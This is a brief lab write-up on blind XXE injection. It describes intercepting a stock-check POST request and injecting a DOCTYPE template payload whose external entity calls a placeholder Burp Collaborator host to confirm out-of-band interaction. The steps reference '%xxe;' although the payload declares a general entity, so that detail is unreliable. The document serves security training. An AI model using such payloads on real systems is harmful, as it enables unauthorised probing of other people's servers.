*This information is only for the purposes of education and skills development.*

**Objective**
Observe DNS lookup and HTTP requests from XML parser in Collaborator. 

**Blind XXE**
- XML External Entity Injection or XXE injection vulnerability allows attacker to interfere with an application's processing of external data that is in XML format. 
- In blind XXE, no values associated with external entities are returned in response.

**Point of Entry**
- On any product page, the *Check Stock* function issues a POST request.
- That request includes stockCheck element which handles XML, which is our point of entry.

**Barrier to entry** 
- As no XML is present in response, XML parsing is considered out-of-band meaning that a separate channel of communication is in use.

**Bypassing Barrier to Entry**
- The out-of-band communication can be viewed using Collaborator. 
- Start intercept and check stock to issue the POST request. 
- Add the payload between XML declaration and `stockCheck` element, as well as replace `productId` value with `%xxe;`. 

**Template Payload**
`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
`


